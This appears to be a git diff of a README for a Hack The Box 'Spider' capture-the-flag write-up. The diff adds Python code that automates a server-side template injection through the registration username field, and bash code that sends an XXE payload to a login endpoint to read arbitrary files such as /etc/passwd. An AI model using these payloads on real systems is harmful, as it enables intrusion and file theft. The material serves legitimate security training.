@@ -4,19 +4,61 @@ Machine write-up: https://7rocky.netlify.app/en/htb/spider
 
 ### `ssti.py`
 
-This Python script is made to automate the explotation of a Server-Side Template Injection (SSTI) which appears when registering a new account at `http://spider.htb` and then reading the user profile.
+This Python script is made to automate the explotation of a Server-Side Template Injection (SSTI) which appears when registering a new account at `http://spider.htb` and then reading the user profile. The vulnerable parameter is `username`.
 
-We can perform the POST request using module `requests` (obviously). This request is done to `http://spider.htb/register` specifying `username`, `confirm_username`, `password` and `confirm_password` as request body.
+We can perform the POST request using module `requests` (obviously). This request is done to `http://spider.htb/register` specifying `username`, `confirm_username`, `password` and `confirm_password` as request body:
 
-After that, we need to catch the UUID that the server gives us. For that we can use a regular expression using module `re`.
+```python
+    data = {
+        'username': username,
+        'confirm_username': username,
+        'password': password,
+        'confirm_password': password
+    }
 
-Then, we need to access to the profile created. For that, we need to perform another POST request (this time to `http://spider.htb/login`) specifying `uuid` and `password`.
+    s = requests.session()
+    r = s.post('http://spider.htb/register', data=data)
+```
+
+After that, we need to catch the UUID that the server gives us. For that we can use a regular expression using module `re`:
+
+```python
+    try:
+        uuid = re.search(
+            r'<input type="text" name="username" value="(.*?)" />', r.text).group(1)
+    except AttributeError:
+        print(r.text)
+        sys.exit()
+```
+
+If an error occurs, we print the whole response to try looking for errors.
+
+Then, we need to access to the profile created. For that, we need to perform another POST request (this time to `http://spider.htb/login`) specifying `uuid` and `password`:
+
+```python
+    s.post('http://spider.htb/login',
+           data={'username': uuid, 'password': password})
+    r = s.get('http://spider.htb/user')
+```
 
 However, this POST request only sets a cookie and redirects to the main page. By using a `requests` session we can keep the cookie for next requests.
 
-If we access `http://spider.htb/user` (with a GET request), here is where we can see the SSTI payload being executed. We know that the data is in the `username` field. Again, using a regular expression we are able to extract the data we are interested in.
+If we access `http://spider.htb/user` (with a GET request), here is where we can see the SSTI payload being executed. We know that the data is in the `username` field. Again, using a regular expression we are able to extract the data we are interested in:
 
-Finally, we can print this result. For example:
+```python
+    try:
+        result = re.search(
+            r'<input type="text" name="username" readonly value="(.*?)" />', r.text).group(1)
+        result = result.replace('&#39;', "'").replace(
+            '&lt;', '<').replace('&gt;', '>')
+        print(result)
+    except AttributeError:
+        print(r.text)
+```
+
+Again, if an error occurs, we print the whole response.
+
+Finally, we can execute the script as follows:
 
 ```console
 $ python3 ssti.py '{{7*7}}'
@@ -93,13 +135,34 @@ ENDTAG</username>
 
 Notice that `BEGINTAG` and `ENDTAG` are placed to use `grep` and extract the relevant data (which will be rendered in `&xxe;`).
 
-This parameters must be placed in a `curl` POST request to `http://localhost:8888/login` as data. We are interested in the cookie that the server returns. That is why we use verbose mode and use `grep` and `sed` to get the exact value of a valid Cookie header.
+This parameters must be placed in a `curl` POST request to `http://localhost:8888/login` as data. We are interested in the cookie that the server returns. That is why we use verbose mode and use `grep` and `sed` to get the exact value of a valid Cookie header:
 
-This data of `&xxe;` will be rendered in the website, so we can use `curl` to `http://localhost:8888/site` providing the cookie obtained before.
+```bash
+data="username=BEGINTAG
+%26xxe;
+ENDTAG&version=1.33.7 -->
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://$file\"> ]>
+<!-- Pwned"
 
-Finally, using `grep` we can filter the file contents. This is done by obtaining the line numbers where `BEGINTAG` and `ENDTAG` are in the HTTP response. Then we can print the data between those numbers using `sed`.
+cookie=$(curl http://localhost:8888/login -vsd "$data" 2>&1 | grep session= | sed 's/< Set-//g' | tr -d '\r\n')
+```
 
-For example, we can show `/etc/passwd`:
+This data of `&xxe;` will be rendered in the website, so we can use `curl` to `http://localhost:8888/site` providing the cookie obtained before:
+
+```bash
+res=$(curl http://localhost:8888/site -sH "$cookie")
+```
+
+Finally, using `grep` we can filter the file contents. This is done by obtaining the line numbers where `BEGINTAG` and `ENDTAG` are in the HTTP response. Then we can print the data between those numbers using `sed`:
+
+```bash
+begin=$(( $(echo "$res" | grep -n BEGINTAG | awk -F : '{ print $1 }') + 1 ))
+end=$(( $(echo "$res" | grep -n ENDTAG | awk -F : '{ print $1 }') - 1 ))
+
+echo -n "$res" | sed -n "${begin},${end}p"
+```
+
+For example, we can use the script to read `/etc/passwd`:
 
 ```console
 $ bash xxe.sh /etc/passwd
